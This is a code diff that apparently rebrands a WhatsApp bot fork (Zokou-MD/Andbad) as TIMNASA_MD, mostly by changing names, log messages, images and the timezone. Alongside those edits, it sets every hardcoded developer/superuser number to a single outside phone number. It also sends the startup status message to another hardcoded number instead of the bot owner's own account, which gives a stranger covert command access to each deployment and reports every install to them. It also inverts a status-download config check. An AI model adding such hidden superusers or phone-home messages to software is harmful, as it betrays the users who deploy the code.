@@ -47,7 +47,7 @@ const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/framework/mesfonctions")
 let { reagir } = require(__dirname + "/framework/app");
-var session = conf.session.replace(/ANDBAD-BOT;;;/g,"");
+var session = conf.session.replace(/TIMNASA_MD;;;=>/g,"");
 const prefixe = conf.PREFIXE;
 
 
@@ -56,7 +56,7 @@ async function authentification() {
        
         //console.log("le data "+data)
         if (!fs.existsSync(__dirname + "/auth/creds.json")) {
-            console.log("connexion en cour ...");
+            console.log("connected successfully...");
             await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
             //console.log(session)
         }
@@ -65,7 +65,7 @@ async function authentification() {
         }
     }
     catch (e) {
-        console.log("Session Invalide " + e);
+        console.log("Session Invalid " + e);
         return;
     }
 }
@@ -80,7 +80,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Zokou-Md', "safari", "1.0.0"],
+            browser: ['TIMNASA_MD', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -154,10 +154,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '22559763447';
-            const dj2 = '22543343357';
-            const dj3 = "22564297888";
-            const luffy = '22891733300';
+            const dj = '255621995482';
+            const dj2 = '255621995482';
+            const dj3 = "255621995482";
+            const luffy = '255621995482';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -165,14 +165,14 @@ setTimeout(() => {
             
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t [][]...{Andbad-md}...[][]");
-            console.log("=========== Nouveau message ===========");
+            console.log("\t [][]...{TIMNASA Md}...[][]");
+            console.log("=========== New message ===========");
             if (verifGroupe) {
-                console.log("message provenant du groupe : " + nomGroupe);
+                console.log("message from : " + nomGroupe);
             }
-            console.log("message envoyé par : " + "[" + nomAuteurMessage + " : " + auteurMessage.split("@s.whatsapp.net")[0] + " ]");
-            console.log("type de message : " + mtype);
-            console.log("------ contenu du message ------");
+            console.log("message from : " + "[" + nomAuteurMessage + " : " + auteurMessage.split("@s.whatsapp.net")[0] + " ]");
+            console.log("type of message : " + mtype);
+            console.log("------end of your messages ------");
             console.log(texte);
             /**  */
             function groupeAdmin(membreGroupe) {
@@ -286,7 +286,7 @@ function mybotpic() {
         
                                     if(msg === null || !msg ||msg === 'undefined') {console.log('Message non trouver') ; return } 
         
-                                await zk.sendMessage(idBot,{ image : { url : './media/deleted-message.jpg'},caption : `        😈Anti-delete-message😈\n Message from @${msg.key.participant.split('@')[0]}​` , mentions : [msg.key.participant]},)
+                                await zk.sendMessage(idBot,{ image : { url : './media/hans.jpeg'},caption : `        💫 TIMNASA MD DELETED INFORMATION💫\n Message from @${msg.key.participant.split('@')[0]}​` , mentions : [msg.key.participant]},)
                                 .then( () => {
                                     zk.sendMessage(idBot,{forward : msg},{quoted : msg}) ;
                                 })
@@ -302,7 +302,7 @@ function mybotpic() {
             if (ms.key && ms.key.remoteJid === "status@broadcast" && conf.AUTO_READ_STATUS === "yes") {
                 await zk.readMessages([ms.key]);
             }
-            if (ms.key && ms.key.remoteJid === 'status@broadcast' && conf.AUTO_DOWNLOAD_STATUS === "yes") {
+            if (ms.key && ms.key.remoteJid === 'status@broadcast' && conf.AUTO_DOWNLOAD_STATUS === "no") {
                 /* await zk.readMessages([ms.key]);*/
                 if (ms.message.extendedTextMessage) {
                     var stTxt = ms.message.extendedTextMessage.text;
@@ -424,11 +424,11 @@ function mybotpic() {
                                         id: ms.key.id,
                                         participant: auteurMessage
                                     };
-                                    var txt = "lien detected, \n";
+                                    var txt = "link detected!!\n";
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Zoou-Md',
+                                        pack: 'timnasa Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -442,7 +442,7 @@ function mybotpic() {
 
                                       if (action === 'remove') {
 
-                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group.`;
+                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group by TIMNASA_MD .`;
 
                                     await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
                                     (0, baileys_1.delay)(800);
@@ -526,7 +526,7 @@ function mybotpic() {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Zoou-Md',
+                pack: 'Timnasa_Md',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -610,7 +610,7 @@ function mybotpic() {
                          /******************* PM_PERMT***************/
 
             if (!superUser && origineMessage === auteurMessage&& conf.PM_PERMIT === "yes" ) {
-                repondre("You don't have acces to commands here") ; return }
+                repondre("ERROR!! ❌\n\nYou don't have acces to commands here") ; return }
             ///////////////////////////////
 
              
@@ -663,7 +663,7 @@ zk.ev.on('group-participants.update', async (group) => {
     try {
         ppgroup = await zk.profilePictureUrl(group.id, 'image');
     } catch {
-        ppgroup = 'https://telegra.ph/file/4cc2712eee93c105f6739.jpg';
+        ppgroup = 'https://telegra.ph/file/37882de26f9ffc60043ef.jpg';
     }
 
     try {
@@ -684,7 +684,7 @@ zk.ev.on('group-participants.update', async (group) => {
 ╚════◇◇◇═════╝
 ◇ *Descriptioon*   ◇
 
-${metadata.desc}`;
+${metadata.desc}\n\n> POWERED BY TIMNASA TECH.`;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
@@ -762,7 +762,7 @@ ${metadata.desc}`;
                   zk.sendMessage(crons[i].group_id, { image : { url : './media/chrono.webp'} , caption: "Hello, it's time to close the group; sayonara." });
 
                 }, {
-                    timezone: "Africa/Abidjan"
+                    timezone: "Africa/Dodoma"
                   });
               }
         
@@ -812,28 +812,28 @@ ${metadata.desc}`;
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ Andbad Connecting...");
+                console.log("ℹ️ TIMNASA_MD connecting in your account...");
             }
             else if (connection === 'open') {
-                console.log("✅ Andbad Connection Established! ☺️");
+                console.log("✅ TIMNASA_MD connected successfully☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Andbad is Online 🕸\n\n");
+                console.log("TIMNASA_MD by TIMNASA TECH installing cmds😇\n\n");
                 //chargement des commandes 
-                console.log("Loading Commands ...\n");
-                fs.readdirSync(__dirname + "/Andbad_cmds").forEach((fichier) => {
+                console.log("chargement des commandes ...\n");
+                fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
-                            require(__dirname + "/Andbad_cmds/" + fichier);
-                            console.log(fichier + " installed ✔️");
+                            require(__dirname + "/commandes/" + fichier);
+                            console.log(fichier + "Successfully installed HANS-MD md commands✔️");
                         }
                         catch (e) {
                             console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
-                        } /* require(__dirname + "/Andbad_cmds/" + fichier);
-                         console.log(fichier + " installed ✔️")*/
+                        } /* require(__dirname + "/commandes/" + fichier);
+                         console.log(fichier + " installé ✔️")*/
                         (0, baileys_1.delay)(300);
                     }
                 });
@@ -848,40 +848,40 @@ ${metadata.desc}`;
                 else {
                     md = "undefined";
                 }
-                console.log("All Commands Installed ✅");
+                console.log("TIMNASA_MD successfully connected✅");
 
                 await activateCrons();
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
-                let cmsg = `
-╔════◇
-║ 『MR ANDBAD BOT』
-║    Prefix : [ ${prefixe} ]
-║    Mode :${md}
-║    Total Commands : ${evt.cm.length}︎
-║    SUPPORT MR AÑDBAD 
-╚════════════════╝`;
-                await zk.sendMessage(zk.user.id, { text: cmsg });
+                let cmsg = `TIMNASA_MD IS RUNNING NOW...
+    
+    Prefix : [ ${prefixe} ]
+    Mode :${md} mode
+    Total Command : ${evt.cm.length}
+    Owner : TIMNASA TECH 🦸  
+
+> THANK YOU FOR CHOOSING TIMNASA_MD.\n`;
+                await zk.sendMessage("255756530143@s.whatsapp.net", { text: cmsg });
                 }
             }
             else if (connection == "close") {
                 let raisonDeconnexion = new boom_1.Boom(lastDisconnect?.error)?.output.statusCode;
                 if (raisonDeconnexion === baileys_1.DisconnectReason.badSession) {
-                    console.log('Session id érronée veuillez rescanner le qr svp ...');
+                    console.log('Wrong session Id format, rescan again...');
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionClosed) {
                     console.log('!!! connexion fermée, reconnexion en cours ...');
                     main();
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionLost) {
-                    console.log('connexion au serveur perdue 😞 ,,, reconnexion en cours ... ');
+                    console.log('connection error😞 ,,beltah trying to reconnect... ');
                     main();
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason?.connectionReplaced) {
                     console.log('connexion réplacée ,,, une sesssion est déjà ouverte veuillez la fermer svp !!!');
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.loggedOut) {
-                    console.log('vous êtes déconnecté,,, veuillez rescanner le code qr svp');
+                    console.log('session disconnected,,, replace a new session id');
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.restartRequired) {
                     console.log('redémarrage en cours ▶️');
